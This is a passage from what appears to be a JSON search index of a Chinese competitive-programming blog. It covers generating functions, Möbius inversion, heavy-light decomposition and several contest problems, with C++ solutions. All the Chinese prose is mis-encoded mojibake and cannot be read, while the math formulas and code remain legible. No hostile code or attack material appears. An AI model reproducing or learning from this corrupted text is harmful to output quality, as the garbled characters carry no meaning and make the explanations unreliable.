ä¸ªæ°´æœï¼Œä½†æ˜¯æ°´æœåº—è¦æ±‚ï¼Œå–çš„è‹¹æœæ•°å¿…é¡»æ˜¯å¶æ•°ï¼Œå–çš„é¦™è•‰æ•°å¿…é¡»æ˜¯ $3$ çš„å€æ•°ï¼Œå–çš„è‰è“æ•°ä¸èƒ½è¶…è¿‡ $5$ ä¸ªã€‚æ±‚æœ‰å¤šå°‘ç§å– $n$ ä¸ªæ°´æœçš„æ–¹æ¡ˆã€‚ è‹¹æœï¼š$A(x) = 1+x^2+x^4+\\cdots$ é¦™è•‰ï¼š$B(x) = 1 + x^3 + x^6+\\cdots$ è‰è“ï¼š$C(x) = 1 + x + x ^2 + x ^3 + x ^ 4 + x ^ 5$ é‚£ä¹ˆç­”æ¡ˆå°±æ˜¯ $[x^n]A(x)B(x)C(x)$ Devu and Flowers $n$ ç§èŠ±ï¼Œåˆ†åˆ«æœ‰ $f_1,f_2,\\cdots,f_n$ ä¸ªï¼Œæ±‚å– $s$ æœµèŠ±çš„æ–¹æ¡ˆæ•° $(1 \\le n \\le 20, 0 \\le f_i \\le 10^{12}, 0 \\le s \\le 10^{14})$ æ¯ä¸€æœµèŠ±çš„ç”Ÿæˆå‡½æ•°ï¼š $$F_i(x) = 1 + x + x ^2 + \\cdots + x^{f_i} = \\frac{1 - x^{f_i + 1}}{1 - x}$$ æ–¹æ¡ˆæ•°ï¼š $$F(x) = F_1(x)F_2(x)\\cdots F_n(x) = \\frac{\\prod_{i = 1}^{n}(1-x^{f_i + 1})}{(1-x)^n}$$ è®¾ $A(x) = \\prod_{i = 1}^{n}(1-x^{f_i + 1})$ é‚£ä¹ˆç­”æ¡ˆå°±ä¸º $$[x^s]F(x) = \\sum_{i = 0}^{s}[x^i]A(x) [x^{ s- i}] \\frac{1}{(1 - x)^n}$$ ç­‰ä»·äº $$[x^s]F(x) = \\sum_{i = 0}^{s}[x^i]A(x) C_{s - i + n - 1}^{n - 1} $$ [CEOI2004] Sweets $n$ ç§ç³–æœï¼Œåˆ«åˆ†æœ‰ $m_1,m_2,\\cdots,m_n$ ä¸ªï¼Œæ±‚å–ä¸å°‘äº $a$ ä¸å¤šäº $b$ é¢—ç³–æœçš„æ–¹æ¡ˆæ•°ã€‚ $(1 \\le n \\le 10, 0 \\le a \\le b \\le 10^7,0 \\le m_i \\le 10^6)$ æ¯ä¸€ä¸ªç³–æœçš„ç”Ÿæˆå‡½æ•°ï¼š $$F_i(x) = 1 + x + x ^2 + \\cdots + x^{m_i} = \\frac{1 - x^{m_i + 1}}{1 - x}$$ æ–¹æ¡ˆæ•°ï¼š $$F(x) = F_1(x)F_2(x)\\cdots F_n(x) = \\frac{\\prod_{i = 1}^{n}(1-x^{m_i + 1})}{(1-x)^n}$$ é‚£ä¹ˆç­”æ¡ˆå°±ä¸º $$\\sum_{s = a}^{b}[x^s]F(x) = \\sum_{s = a}^{b}\\sum_{i = 0}^{s}[x^i]A(x) C_{s - i + n - 1}^{n - 1}$$ æ ¹æ®ç»„åˆæ•°å…¬å¼ $$C_{a}^{j}+C_{a + 1}^{j} + \\cdots+C_{b}^{j} = C_{b + 1}^{j + 1} - C_{a}^{j + 1}$$ å¾—åˆ° $$\\sum_{i = 0}^{s}[x^i]A(x) (C_{a - i + n}^{n} - C_{b - i+ n - 1}^{n})$$ ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:2:3","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æŒ‡æ•°ç”Ÿæˆå‡½æ•° ä¸€ä¸ªæ•°åˆ— ${a_n}$ å¯¹åº”çš„æŒ‡æ•°ç”Ÿæˆå‡½æ•°ä¸º $f(x) = \\sum_{i = 0}^{\\infty}a_i\\dfrac{x_i}{i!}$ ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:3:0","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å®šç†ï¼š è®¾ $S = {a_1,a_2,\\cdots,a_k}$ ï¼Œä¸” $a_i$ å¯ä»¥å–çš„æ¬¡æ•°çš„é›†åˆä¸º $M_i$ ï¼Œè®° $F_i(x) = \\sum_{u \\in M_i}\\dfrac{x^u}{u!}$ ï¼Œåˆ™ä» $S$ ä¸­å– $n$ ä¸ªå…ƒç´ æ’æˆä¸€åˆ—çš„æ–¹æ¡ˆæ•° $g(n)$ çš„æŒ‡æ•°ç”Ÿæˆå‡½æ•° $G(x) = \\sum_{i =0}^{\\infty}g(i)\\dfrac{x^i}{i!}$ æ»¡è¶³ï¼š $$G(x) = F_1(x)F_2(x) \\cdots F_k(x)$$ å¸¸è§å…¬å¼ï¼š $$\\sum_{i = 0}^{\\infty}\\frac{x^i}{i!} = e^x$$ $$\\sum_{i = 0}^{\\infty}a^i\\frac{x^i}{i!} = e^{ax}$$ ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:3:1","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä¾‹é¢˜ï¼š blocks ä¸€æ®µé•¿åº¦ä¸º $n$ çš„åºåˆ—ï¼Œä½ æœ‰çº¢é»„è“ç»¿ $4$ ç§é¢œè‰²çš„ç –å—ï¼Œä¸€å—ç –é•¿åº¦ä¸º $1$ï¼Œé—®ä½ é“ºç –çš„æ–¹æ¡ˆæ•°ï¼Œå…¶ä¸­çº¢è‰²ç –å’Œç»¿è‰²ç –çš„æ•°é‡å¿…é¡»ä¸ºå¶æ•° ç­”æ¡ˆå¯èƒ½å¾ˆå¤§ï¼Œè¯·è¾“å‡º $\\bmod 10007$ åçš„ç»“æœ è®¾ $$F(x) = 1 + \\dfrac{x^2}{2!} + \\dfrac{x^4}{4!} +\\cdots = \\dfrac{e^{x}+e^{-x}}{2}$$ $$G(x) = 1 + x+\\dfrac{x^2}{2!} + \\dfrac{x^3}{3!} +\\cdots = e^x$$ åˆ™ç­”æ¡ˆä¸º $$n!\\times[x^n]F^2(x)G^2(x) = n!\\times[x^n]\\frac{e^{4x}+2e^{2x} + 1}{4}=\\frac{4^n+2\\times2^n}{4} = 4^{n - 1} + 2^{n - 1}$$ ","date":"2021-12-06","objectID":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/:3:2","tags":["ç”Ÿæˆå‡½æ•°"],"title":"ç”Ÿæˆå‡½æ•°","uri":"/posts/cp%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜æ„ æ±‚ $$\\sum_{k = 1}^{n}\\sum_{i \\mid k} \\sum_{j \\mid i} \\lambda(i) \\lambda(j)$$ å¯¹ $998244353$ å–æ¨¡ å…¶ä¸­ $\\lambda(x) = (-1)^{\\sum\\limits_{i}e_i},x=\\prod\\limits_{i}p_i^{e_i}$ åˆ†æï¼š $\\lambda(x)$ ä¸ºåˆ˜ç»´å°”å‡½æ•°ï¼Œå¯ä»¥æ‰“è¡¨å‘ç° $$\\sum_{d \\mid n}\\lambda(d) =[n = a^2,a \\in N^+]$$ ä¹Ÿå°±æ˜¯ $n$ æ˜¯å¦ä¸ºå®Œå…¨å¹³æ–¹æ•° æŠŠå¼å­ä¸­çš„ $\\lambda(i)$ æåˆ°å‰é¢ $$\\sum_{k = 1}^{n}\\sum_{i \\mid k} \\lambda(i)\\sum_{j \\mid i} \\lambda(j)$$ é‚£ä¹ˆå°±å˜ä¸º $$\\sum_{k = 1}^{n}\\sum_{i \\mid k} \\lambda(i)[i= a^2,a \\in N^+]$$ é‚£ä¹ˆå®Œå…¨å¹³æ–¹æ•°çš„åˆ˜ç»´å°”å‡½æ•°ä¸º $1$ï¼Œå†è®¾ $f(x)=[i= a^2,a \\in N^+]$ å¾— $$\\sum_{i = 1}^{n}\\sum_{d \\mid i}f(d)$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$\\sum_{d = 1}^{n}f(d) \\lfloor\\frac{n}{d}\\rfloor$$ è¿™æ ·ç›´æ¥æšä¸¾å¹³æ–¹æ•°å³å¯ï¼Œæ—¶é—´å¤æ‚åº¦ $O(\\sqrt{n})$ ","date":"2021-11-20","objectID":"/posts/cp2021-ccpc%E5%A8%81%E6%B5%B7%E7%83%AD%E8%BA%AB%E8%B5%9B-number-theory/:0:0","tags":["æ‰“è¡¨","æ¨å¼å­"],"title":"[2021 CCPCå¨æµ·çƒ­èº«èµ›] Number Theory","uri":"/posts/cp2021-ccpc%E5%A8%81%E6%B5%B7%E7%83%AD%E8%BA%AB%E8%B5%9B-number-theory/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int mod = 998244353; int n, res; signed main() { cin \u003e\u003e n; for (int i = 1; i * i \u003c= n; i ++) { res = (res + n / (i * i)) % mod; } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2021-11-20","objectID":"/posts/cp2021-ccpc%E5%A8%81%E6%B5%B7%E7%83%AD%E8%BA%AB%E8%B5%9B-number-theory/:1:0","tags":["æ‰“è¡¨","æ¨å¼å­"],"title":"[2021 CCPCå¨æµ·çƒ­èº«èµ›] Number Theory","uri":"/posts/cp2021-ccpc%E5%A8%81%E6%B5%B7%E7%83%AD%E8%BA%AB%E8%B5%9B-number-theory/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€é¢— $n$ ä¸ªèŠ‚ç‚¹å¹¶ä¸”æ ¹ä¸º $1$ çš„æ ‘å’Œ $q$ æ¬¡è¯¢é—®ï¼Œæ¯æ¬¡è¯¢é—®ç»™å®š $l,r,z$ æ±‚ $$\\sum_{i=l}^{r} \\text{dep}(\\text{lca}(i,z))$$ å¯¹ $201314$ å–æ¨¡ $\\text{dep}(x)$ è¡¨ç¤ºç‚¹ $x$ çš„æ·±åº¦ï¼Œ$\\text{lca}(u,v)$ è¡¨ç¤º $u,v$ çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ $1 \\le n,q \\le 5Ã—10^4$ åˆ†æï¼š å¯¹å¼å­è¿›è¡Œä¸€æ­¥è½¬åŒ–ï¼Œé‚£å°±ç›¸å½“äºåœ¨ $[l,r]$ åŒºé—´å†…çš„æ¯ä¸ªç‚¹ï¼Œæ¯æ¬¡å°†è¯¥ç‚¹å’Œæ ‘æ ¹çš„è·¯å¾„ä¸Šç‚¹æƒ $+1$ï¼Œæœ€åæŸ¥è¯¢ $z$ åˆ°æ ‘æ ¹è·¯å¾„çš„ç‚¹æƒä¹‹å’Œã€‚è¿™æ ·åšæ˜¾ç„¶æ˜¯è¶…æ—¶çš„ï¼Œæ‰€ä»¥å°±è€ƒè™‘æ€ä¹ˆä¼˜åŒ–å¼å­ï¼Œæˆ‘ä»¬å‘ç°æ¯æ¬¡è¯¢é—®æ˜¯åœ¨ $[1,n]$ åŒºé—´çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥æƒ³åˆ°å‰ç¼€å’Œï¼Œä¹Ÿå°±æ˜¯ $$\\sum_{i=l}^{r} \\text{dep}(\\text{lca}(i,z))=\\sum_{i=1}^{r} \\text{dep}(\\text{lca}(i,z)) - \\sum_{i=1}^{l - 1} \\text{dep}(\\text{lca}(i,z))$$ è¿™æ ·å°±å¯ä»¥å°†ä¸€ä¸ªè¯¢é—®åˆ†ä¸ºä¸¤ä¸ªè¯¢é—®ï¼Œé‚£åªéœ€è¦å¤„ç†æ¯ä¸ªè¯¢é—®çš„ $r$ å’Œ $l-1$ æœ€åç›¸å‡å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç¦»çº¿æ¥åšï¼š å¯¹äºæ¯ä¸ªä¿®æ”¹ï¼šç»´æŠ¤ä¸€ä¸ªå·®åˆ†ï¼Œå°±ç›¸å½“äºåœ¨åŒºé—´ $[l-1, r]$ éƒ½ $+1$ï¼Œè¡¨ç¤ºè¦åœ¨åŒºé—´é‡Œçš„æ¯ä¸ªç‚¹åŠ ä¸€æ¬¡å¯¹æ ‘æ ¹çš„è´¡çŒ®(ä¹Ÿå°±æ˜¯ $1$)ã€‚ å¯¹äºæ¯ä¸ªæŸ¥è¯¢ï¼šåœ¨ $r$ å’Œ $l - 1$ æŒ‚ä¸Š $z$ çš„è¯¢é—®ï¼Œå·¦ç«¯ç‚¹æ‰“ä¸Š $0$ çš„æ ‡è®°ï¼Œ å³ç«¯ç‚¹æ‰“ä¸Š $1$ çš„æ ‡è®°ã€‚ æœ€åä» $1$ åˆ° $n$ æ‰«ä¸€éï¼Œå…ˆåˆ¤æ–­å·®åˆ†ï¼Œå¦‚æœæ˜¯å¤§äº$0$çš„ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¿™ä¸ªç‚¹è¦ä¿®æ”¹ä¸€æ¬¡ã€‚åœ¨åˆ¤æ–­è¯¢é—®ï¼Œå¦‚æœé‡åˆ°æœ‰æ ‡è®°çš„ç‚¹å°±æŸ¥è¯¢ $z$ åˆ° æ ‘æ ¹çš„è·¯å¾„å’Œï¼Œè®¾å½“å‰çš„è¯¢é—®ç¼–å·ä¸º $id$ï¼Œ $0$ çš„è¯å°±è®°åˆ° $L_{id}$ ï¼Œ$1$ çš„è¯å°±è®°åˆ° $R_{id}$ï¼Œæ¯ä¸ªè¯¢é—®çš„ç­”æ¡ˆå°±æ˜¯ $R_{id} - L_{id}$ ","date":"2021-11-01","objectID":"/posts/cplnoi2014-lca/:0:0","tags":["ç¦»çº¿","å·®åˆ†","æ ‘é“¾å‰–åˆ†"],"title":"[LNOI2014] LCA","uri":"/posts/cplnoi2014-lca/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 5e4 + 5, M = N \u003c\u003c 1, mod = 201314; int L[N], R[N], sum[N], n, m, h[N], e[M], ne[M], idx, l, v, r, z, top[N], Size[N], fa[N], son[N], dep[N], cnt, id[N]; struct SegmentTree { int l, r, add, sum; } tr[N \u003c\u003c 2]; struct node { int id, z, type; }; vector\u003cnode\u003e num[N]; void add(int a, int b) { e[idx] = b, ne[idx] = h[a], h[a] = idx ++; } void dfs1(int u, int father, int depth) { dep[u] = depth, fa[u] = father, Size[u] = 1; for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == father) continue; dfs1(j, u, depth + 1); Size[u] += Size[j]; if (Size[son[u]] \u003c Size[j]) son[u] = j; } } void dfs2(int u,int t) { id[u] = ++ cnt, top[u] = t; if (!son[u]) return ; dfs2(son[u], t); for (int i = h[u]; ~i; i = ne[i]) { int j = e[i]; if (j == fa[u] || j == son[u]) continue; dfs2(j, j); } } void pushup(int u) { tr[u].sum = (tr[u \u003c\u003c 1].sum + tr[u \u003c\u003c 1 | 1].sum) % mod; } void pushdown(int u) { if (tr[u].add) { tr[u \u003c\u003c 1].add += tr[u].add; tr[u \u003c\u003c 1 | 1].add += tr[u].add; tr[u \u003c\u003c 1].sum += (tr[u \u003c\u003c 1].r - tr[u \u003c\u003c 1].l + 1) * tr[u].add % mod; tr[u \u003c\u003c 1 | 1].sum += (tr[u \u003c\u003c 1 | 1].r - tr[u \u003c\u003c 1 | 1].l + 1) * tr[u].add % mod; tr[u].add = 0; } } void build(int u, int l, int r) { if (l == r) { tr[u] = {l, r}; } else { tr[u] = {l, r}; int mid = l + r \u003e\u003e 1; build(u \u003c\u003c 1, l, mid), build(u \u003c\u003c 1 | 1, mid + 1, r); pushup(u); } } void modify(int u, int l, int r, int c) { if (tr[u].l \u003e= l \u0026\u0026 tr[u].r \u003c= r) { tr[u].add += c; tr[u].sum += (tr[u].r - tr[u].l + 1) * c % mod; return ; } pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1; if (l \u003c= mid) modify(u \u003c\u003c 1, l, r, c); if (r \u003e mid) modify(u \u003c\u003c 1 | 1, l, r, c); pushup(u); } int ask(int u, int l, int r) { if (tr[u].l \u003e= l \u0026\u0026 tr[u].r \u003c= r) return tr[u].sum; pushdown(u); int mid = tr[u].l + tr[u].r \u003e\u003e 1, res = 0; if (l \u003c= mid) res = (res + ask(u \u003c\u003c 1, l, r)) % mod; if (r \u003e mid) res = (res + ask(u \u003c\u003c 1 | 1, l, r)) % mod; return res; } void modify_path(int u, int v, int k) { while (top[u] != top[v]) { if (dep[top[u]] \u003c dep[top[v]]) swap(u, v); modify(1, id[top[u]], id[u], k); u = fa[top[u]]; } if (dep[u] \u003c dep[v]) swap(u, v); modify(1, id[v], id[u], k); } int ask_path(int u, int v) { int res = 0; while (top[u] != top[v]) { if (dep[top[u]] \u003c dep[top[v]]) swap(u, v); res = (res + ask(1, id[top[u]], id[u])) % mod; u = fa[top[u]]; } if (dep[u] \u003c dep[v]) swap(u, v); res = (res + ask(1, id[v], id[u])) % mod; return res; } signed main() { memset(h, -1, sizeof h); cin \u003e\u003e n \u003e\u003e m; for (int u = 2; u \u003c= n; u ++) { cin \u003e\u003e v, v ++; add(u, v), add(v, u); } dfs1(1, -1, 1), dfs2(1, 1); build(1, 1, n); for (int i = 1; i \u003c= m; i ++) { cin \u003e\u003e l \u003e\u003e r \u003e\u003e z, l ++, r ++, z ++; sum[l] ++, sum[r + 1] --; num[l - 1].push_back({i, z, 0}); num[r].push_back({i, z, 1}); } for (int i = 1; i \u003c= n; i ++) { sum[i] += sum[i - 1]; if (sum[i]) modify_path(i, 1, 1); for (int j = 0; j \u003c num[i].size(); j ++) { if (num[i][j].type == 0) { L[num[i][j].id] = ask_path(num[i][j].z, 1); } else { R[num[i][j].id] = ask_path(num[i][j].z, 1); } } } for (int i = 1; i \u003c= m; i ++) { cout \u003c\u003c (R[i] - L[i] + mod) % mod \u003c\u003c endl; } } ","date":"2021-11-01","objectID":"/posts/cplnoi2014-lca/:1:0","tags":["ç¦»çº¿","å·®åˆ†","æ ‘é“¾å‰–åˆ†"],"title":"[LNOI2014] LCA","uri":"/posts/cplnoi2014-lca/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æ±‚ä»åŒºé—´ $[L,R]$ é€‰å‡º $n$ ä¸ªæ•°ä½¿å¾—æœ€å¤§å…¬çº¦æ•°ä¸º $k$ çš„æ–¹æ¡ˆæ•°ï¼Œå¯¹ $10^9 + 7$ å–æ¨¡ $1 \\le n,k \\le 10^9$ $1 \\le L \\le R \\le10^9$ åˆ†æï¼š æ ¹æ®é¢˜æ„ $$\\sum_{a_1=L}^{R}\\sum_{a_2=L}^{R}\\cdots\\sum_{a_n=L}^{R}[\\gcd(a_1,a_2,\\cdots,a_n)=k]$$ æŠŠ $k$ æ‹¿åˆ°ä¸Šä¸‹ç•Œ $$\\sum_{a_1=\\lfloor \\frac{L-1}{k} \\rfloor +1}^{\\lfloor \\frac{R}{k} \\rfloor}\\sum_{a_2=\\lfloor \\frac{L - 1}{k} \\rfloor + 1}^{\\lfloor \\frac{R}{k} \\rfloor}\\cdots\\sum_{a_n=\\lfloor \\frac{L - 1}{k} \\rfloor + 1}^{\\lfloor \\frac{R}{k} \\rfloor}[\\gcd(a_1,a_2,\\cdots,a_n)=1]$$ è«æ¯”ä¹Œæ–¯åæ¼” $$\\sum_{a_1=\\lfloor \\frac{L-1}{k} \\rfloor +1}^{\\lfloor \\frac{R}{k} \\rfloor}\\sum_{a_2=\\lfloor \\frac{L-1}{k} \\rfloor +1}^{\\lfloor \\frac{R}{k} \\rfloor}\\cdots\\sum_{a_n=\\lfloor \\frac{L-1}{k} \\rfloor +1}^{\\lfloor \\frac{R}{k} \\rfloor}\\sum_{d \\mid \\gcd(a_1,a_2,\\cdots,a_n)} \\mu(d)$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$\\sum_{d=1}^{\\lfloor \\frac{R}{k} \\rfloor}\\mu(d) (\\lfloor \\frac{R}{kd}\\rfloor - \\lfloor \\frac{L - 1}{kd}\\rfloor)^n$$ ç„¶åç”¨æœæ•™ç­›åš ","date":"2021-10-19","objectID":"/posts/cpcqoi2015-%E9%80%89%E6%95%B0/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[CQOI2015] é€‰æ•°","uri":"/posts/cpcqoi2015-%E9%80%89%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5, mod = 1e9 + 7; int n, k, L, R, primes[N], mobius[N], cnt, res, sum[N]; bool st[N]; unordered_map\u003cint, int\u003e mp; int qmi(int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = res * a % mod; a = a * a % mod; b \u003e\u003e= 1; } return res; } void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = (sum[i - 1] + mobius[i] + mod) % mod; } int Sum(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = 1; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res = (res - Sum(n / l) * (r - l + 1) % mod + mod) % mod; } return mp[n] = res; } signed main() { get_mobius(N - 1); cin \u003e\u003e n \u003e\u003e k \u003e\u003e L \u003e\u003e R; L = (L - 1) / k, R /= k; for (int l = 1, r; l \u003c= R; l = r + 1) { r = min(R / (R / l), L / l ? L / (L / l) : mod); res = (res + (Sum(r) - Sum(l - 1)) * qmi(R / l - L / l, n) % mod + mod) % mod; } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2021-10-19","objectID":"/posts/cpcqoi2015-%E9%80%89%E6%95%B0/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æœæ•™ç­›"],"title":"[CQOI2015] é€‰æ•°","uri":"/posts/cpcqoi2015-%E9%80%89%E6%95%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æ±‚ $$\\prod_{i=1}^{n}\\prod^{n}_{j=1}\\frac{\\text{lcm}(i,j)}{\\gcd(i,j)}$$ å¯¹ $104857601$ å–æ¨¡ $1 \\le n \\le 10^6$ åˆ†æï¼š å°† $\\text{lcm}(i,j)=\\dfrac{i \\cdot j}{\\gcd(i,j)}$ æ›¿æ¢åŸå¼å¾— $$\\prod_{i=1}^{n}\\prod^{n}_{j=1}\\frac{i \\cdot j}{\\gcd(i,j)^2}$$ å¯¹ $\\gcd(i,j)^2$ æ±‚é€†å…ƒ $$\\prod_{i=1}^{n}\\prod^{n}_{j=1}i \\cdot j \\cdot \\gcd(i,j)^{-2}$$ å‰ååˆ†å¼€æ¥çœ‹ $$\\prod_{i=1}^{n}\\prod_{j=1} ^ {n} i \\cdot j\\prod_{i=1}^{n}\\prod^{n}_{j=1}\\gcd(i,j)^{-2}$$ å‰é¢ $\\prod\\limits_{i=1}^{n}\\prod\\limits_{j=1} ^{n}i \\cdot j=\\prod\\limits_{i=1}^{n}i^n\\prod\\limits_{j=1} ^{n}j=\\prod\\limits_{i=1}^{n}i^n\\cdot n!=(n!)^{n}\\prod\\limits_{i=1}^{n}i^n=(n!)^{2n}$ ååŠéƒ¨åˆ† å…ˆçœ‹åŸæ¥çš„å€¼å†æ±‚é€†å…ƒ $$\\prod_{i=1}^{n}\\prod^{n}_{j=1}\\gcd(i,j)^{2}$$ å…ˆæŠŠå¹³æ–¹æ‹¿å‡ºå»çœ‹é‡Œé¢ $$\\prod_{i=1}^{n}\\prod^{n}_{j=1}\\gcd(i,j)$$ æšä¸¾ $\\gcd(i,j)$ $$\\prod_{d=1}^{n}d^{\\sum\\limits_{i=1}^{n}\\sum\\limits^{n}_{j=1}[\\gcd(i,j)=d]}$$ æŒ‡æ•°éƒ¨åˆ† å› ä¸º $\\sum\\limits_{i=1}^{n}\\sum\\limits_{i=1}^{n}[\\gcd(i,j)=1]=2\\sum\\limits_{i=1}^{n}\\varphi(i)-1$ æ‰€ä»¥ $$\\prod_{d=1}^{n}d^{2\\sum\\limits_{i=1}^{\\lfloor\\frac{n}{d} \\rfloor}\\varphi(i)-1}$$ æœ€åç­”æ¡ˆä¸º $$(n!)^{2n}\\cdot (\\prod_{d=1}^{n}d^{2\\sum\\limits_{i=1}^{\\lfloor\\frac{n}{d} \\rfloor}\\varphi(i)-1})^{-2}$$ ","date":"2021-10-19","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p5221-product/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[æ´›è°· P5221] Product","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p5221-product/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç (æ¯’ç˜¤å‡ºé¢˜äººå¡ç©ºé—´)ï¼š #include \u003ccstdio\u003e using namespace std; const int N = 1e6 + 5, mod = 104857601; int n, fact = 1, euler[N], primes[N], cnt, res = 1, inv = 1; bool st[N]; int qmi(int a, int b) { int res = 1; while (b) { if (b \u0026 1) res = 1ll * res * a % mod; a = 1ll * a * a % mod; b \u003e\u003e= 1; } return res; } void get_eulers(int n) { euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { euler[t] = euler[i] * primes[j]; break; } euler[t] = euler[i] * (primes[j] - 1); } } for (int i = 1; i \u003c= n; i ++) euler[i] = (euler[i - 1] + 2 * euler[i]) % (mod - 1); } signed main() { scanf(\"%d\", \u0026n); get_eulers(n); for (int i = 1; i \u003c= n; i ++) fact = 1ll * fact * i % mod; res = qmi(fact, 2 * n); for (int i = 1; i \u003c= n; i ++) { inv = (1ll * inv * qmi(i, euler[n / i] - 1)) % mod; } printf(\"%d\\n\", 1ll * res * qmi(1ll * inv * inv % mod, mod - 2) % mod); } ","date":"2021-10-19","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p5221-product/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[æ´›è°· P5221] Product","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p5221-product/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€æ£µ $n$ ä¸ªèŠ‚ç‚¹çš„æ ‘ï¼Œæ¯ä¸ªç‚¹éƒ½æœ‰ä¸€ä¸ªå®—æ•™ $c_i$ å’Œæƒå€¼ $w_i$ æœ‰ $m$ æ¬¡æ“ä½œï¼š $1.$ å°†èŠ‚ç‚¹ $x$ çš„å®—æ•™ $c_x$ ä¿®æ”¹ä¸º $c$ $2.$ å°†èŠ‚ç‚¹ $x$ çš„æƒå€¼ $w_x$ ä¿®æ”¹ä¸º $w$ $3.$ è¯¢é—®æ ‘ä¸Šè·¯å¾„ $u$ åˆ° $v$ å®—æ•™ä¸º $c_u$ çš„æƒå€¼å’Œ (ä¿è¯ $c_u=c_v$ ) $4.$ è¯¢é—®æ ‘ä¸Šè·¯å¾„ $u$ åˆ° $v$ å®—æ•™ä¸º $c_u$ çš„æœ€å¤§æƒå€¼ (ä¿è¯ $c_u=c_v$ ) $1 \\le n,m,c \\le 10^5$ åˆ†æï¼š è¿™ç§æ ‘ä¸Šé—®é¢˜å¯ä»¥æƒ³åˆ°æ ‘é“¾å‰–åˆ†ï¼Œé‚£ä¹ˆé‡ç‚¹æ˜¯çº¿æ®µæ ‘å¦‚ä½•ç»´æŠ¤ï¼Œæ¯ä¸ªç‚¹å¯èƒ½ä¼šè®°å½• $10^5$ ç§å®—æ•™ï¼Œç©ºé—´æ˜¾ç„¶æ˜¯å¼€ä¸ä¸‹çš„ï¼Œä½†æ˜¯è¯¢é—®åªæœ‰ $10^5$ï¼Œæ‰€ä»¥å¯ä»¥ç»™æ¯ä¸ªå®—æ•™å¼€ä¸€é¢—æƒå€¼çº¿æ®µæ ‘ï¼Œç„¶åç”¨åŠ¨æ€å¼€ç‚¹çš„æ–¹å¼ç»´æŠ¤æ“ä½œã€‚æˆ‘ä»¬å°±åœ¨æƒå€¼çº¿æ®µæ ‘ä¸Šè®°å½•æ¯ä¸ªç‚¹å¯¹åº”å®—æ•™çš„æƒå€¼ï¼Œä¹Ÿå°±æ˜¯åšæ˜ å°„ $c_u \\rightarrow w_u$ æ¯æ¬¡å¦‚æœä¿®æ”¹æŸä¸ªç‚¹çš„å®—æ•™ $c_u$ ä¸ºæ–°å®—æ•™ $c$ï¼Œé‚£ä¹ˆå°±å…ˆæ¸…ç©ºåŸå®—æ•™çš„æƒå€¼ $c_u=0$ï¼Œç„¶åæŠŠåŸæ¥çš„æƒå€¼ç»™æ–°å®—æ•™ $c=w_u$ï¼Œæœ€åæ”¹å˜å®—æ•™ $c_u=c$ 